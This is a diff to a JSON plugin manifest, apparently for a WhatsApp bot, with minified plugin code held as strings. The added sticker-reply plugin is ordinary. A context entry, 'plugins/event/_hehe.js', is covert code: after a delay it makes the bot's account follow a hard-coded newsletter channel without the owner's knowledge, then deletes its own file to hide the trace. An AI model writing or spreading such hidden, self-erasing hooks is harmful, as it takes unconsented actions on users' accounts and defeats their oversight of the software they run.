@@ -136,6 +136,10 @@
     {
       "path": "plugins/event/_hehe.js",
       "code": "\"exports.run={main:async(n,{anya:l})=>{try{\\\"autofollowch\\\"in l||(l.autofollowch=setTimeout(async function(){await l.newsletterFollow(\\\"120363375037255604@newsletter\\\")},18e4),fs.unlinkSync(__filename))}catch{console.log(\\\"auto follow channel failed.\\\"),fs.unlinkSync(__filename)}}};\""
+    },
+    {
+      "path": "plugins/event/_responsticker.js",
+      "code": "\"exports.run={main:async(a,{anya:i,packname:r,author:e,isPrem:n})=>{a.budy&&global.db.sticker[a.budy]&&n&&i.sendStickerFromUrl(a.chat,global.db.sticker[a.budy].link,a,{packname:r,author:e,expiration:a.expiration})},limit:!0};\""
     }
   ],
   "remove": [
